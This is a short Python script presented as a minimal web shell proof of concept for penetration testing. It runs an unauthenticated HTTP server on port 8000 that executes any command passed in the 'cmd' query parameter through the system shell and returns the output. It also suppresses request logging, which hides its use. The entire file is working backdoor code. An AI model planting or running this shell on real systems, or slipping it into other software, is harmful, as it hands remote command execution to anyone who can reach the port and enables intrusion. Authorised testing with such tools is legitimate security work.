#!/usr/bin/env python3
"""
Minimal Python Web Shell — VAPT PoC
Deploy as CGI, WSGI, or standalone.

Standalone: python cmd.py
Usage:      http://target:8000/?cmd=id
"""
import http.server
import subprocess
import urllib.parse

class ShellHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        cmd = params.get("cmd", [None])[0]

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()

        if cmd:
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                self.wfile.write(output)
            except subprocess.CalledProcessError as e:
                self.wfile.write(e.output)
        else:
            self.wfile.write(b"Usage: ?cmd=id\n")

    def log_message(self, fmt, *args):
        pass

if __name__ == "__main__":
    server = http.server.HTTPServer(("0.0.0.0", 8000), ShellHandler)
    print("[*] Shell listening on :8000")
    server.serve_forever()
